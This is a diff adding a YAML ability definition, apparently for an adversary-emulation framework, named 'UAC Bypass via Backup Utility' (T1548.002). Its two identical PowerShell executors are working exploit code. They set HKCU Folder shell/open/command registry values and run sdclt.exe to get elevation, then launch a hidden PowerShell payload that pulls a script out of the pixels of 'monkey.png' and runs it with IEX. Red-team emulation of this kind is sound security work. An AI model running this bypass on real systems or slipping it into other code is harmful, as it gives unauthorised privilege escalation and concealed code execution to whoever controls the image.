@@ -1,0 +1,67 @@
+ability_id: 89e9dffa-8836-4672-8cf3-bebd006d2a2b
+access: {}
+additional_info: {}
+buckets:
+- privilege-escalation
+delete_payload: true
+description: Modify registry values of sdclt to bypass UAC
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "if (!(test-path -path $env:windir\\system32\\sdclt.exe)) {\n  write-host\
+    \ \"[!] sdclt.exe was not found on this host.\";\n  exit 1;\n}\nNew-Item -Path\
+    \ HKCU:\\Software\\Classes -Name Folder -Force;\nNew-Item -Path HKCU:\\Software\\\
+    Classes\\Folder -Name shell -Force;\nNew-Item -Path HKCU:\\Software\\Classes\\\
+    Folder\\shell -Name open -Force;\nNew-Item -Path HKCU:\\Software\\Classes\\Folder\\\
+    shell\\open -Name command -Force;\n\n$username=\"#{profile_user}\";\n$payload='powershell.exe\
+    \ -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName\
+    \ \"System.Drawing\"; $g=a System.Drawing.Bitmap(\"C:\\Users\\$($username)\\Downloads\\\
+    monkey.png\");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))\"\
+    ';\n\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\\
+    command\" -Name \"(Default)\" -Value $payload -Force;\nSet-ItemProperty -Path\
+    \ \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\
+    \ -Value \"\" -Force;\n\ncmd.exe /c sdclt.exe;\ncmd.exe /c powershell.exe;"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "if (!(test-path -path $env:windir\\system32\\sdclt.exe)) {\n  write-host\
+    \ \"[!] sdclt.exe was not found on this host.\";\n  exit 1;\n}\nNew-Item -Path\
+    \ HKCU:\\Software\\Classes -Name Folder -Force;\nNew-Item -Path HKCU:\\Software\\\
+    Classes\\Folder -Name shell -Force;\nNew-Item -Path HKCU:\\Software\\Classes\\\
+    Folder\\shell -Name open -Force;\nNew-Item -Path HKCU:\\Software\\Classes\\Folder\\\
+    shell\\open -Name command -Force;\n\n$username=\"#{profile_user}\";\n$payload='powershell.exe\
+    \ -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName\
+    \ \"System.Drawing\"; $g=a System.Drawing.Bitmap(\"C:\\Users\\$($username)\\Downloads\\\
+    monkey.png\");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))\"\
+    ';\n\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\\
+    command\" -Name \"(Default)\" -Value $payload -Force;\nSet-ItemProperty -Path\
+    \ \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\
+    \ -Value \"\" -Force;\n\ncmd.exe /c sdclt.exe;\ncmd.exe /c powershell.exe;"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: UAC Bypass via Backup Utility
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: privilege-escalation
+technique_id: T1548.002
+technique_name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
